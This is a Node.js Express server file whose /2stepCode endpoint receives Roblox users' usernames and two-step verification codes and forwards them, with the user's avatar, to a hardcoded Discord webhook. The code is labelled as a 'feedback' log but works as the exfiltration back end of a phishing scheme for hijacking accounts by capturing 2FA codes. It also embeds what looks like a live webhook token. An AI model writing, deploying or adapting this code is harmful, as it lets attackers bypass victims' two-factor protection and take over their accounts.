const express = require("express");
const fetch = require("node-fetch");

const app = express();
app.use(express.json());

const PORT = process.env.PORT || 3000;

const FEEDBACK_WEBHOOK_URL = "https://discord.com/api/webhooks/1381603950108610614/dguYLj6wIdjJdpm6n9UUhbSZdbMjbhJHd650UAJiu7lw2lH8v-GLY1b3wIuMmpwGDDCX";

app.post("/2stepCode", async (req, res) => {
    const { userId, username, code, timestamp } = req.body;

    try {
        const thumbRes = await fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=420x420&format=Png&isCircular=false`);
        const thumbData = await thumbRes.json();

        console.log("Thumbnail Data:", thumbData);

        const imageUrl = thumbData?.data?.[0]?.imageUrl || null;

        console.log("Image URL:", imageUrl);

        if (!imageUrl) {
            console.warn("No image URL found for userId:", userId);
        }

        const embed = {
            username: "FEEDBACK LOG",
            embeds: [
                {
                    title: "**__2-Step Verification Code__**",
                    color: 0x000000,
                    thumbnail: imageUrl ? { url: imageUrl } : undefined,
                    fields: [
                        {
                            name: "Code",
                            value: `> ${code}`
                        },
                        {
                            name: "**Player Info**",
                            value: `**Username:** ${username}\n**Submitted:** ${timestamp}`
                        }
                    ]
                }
            ]
        };

        console.log("Sending embed:", embed);

        const response = await fetch(FEEDBACK_WEBHOOK_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(embed)
        });

        const responseBody = await response.text();

        if (!response.ok) {
            console.error("Discord API error:", response.status, responseBody);
            throw new Error(`Discord error: ${response.status} - ${responseBody}`);
        }

        res.status(200).send("Feedback webhook sent!");
    } catch (err) {
        console.error("Failed to send feedback webhook:", err);
        res.status(500).send("Error sending feedback webhook");
    }
});

app.listen(PORT, () => {
  console.log("Server running on port " + PORT);
});
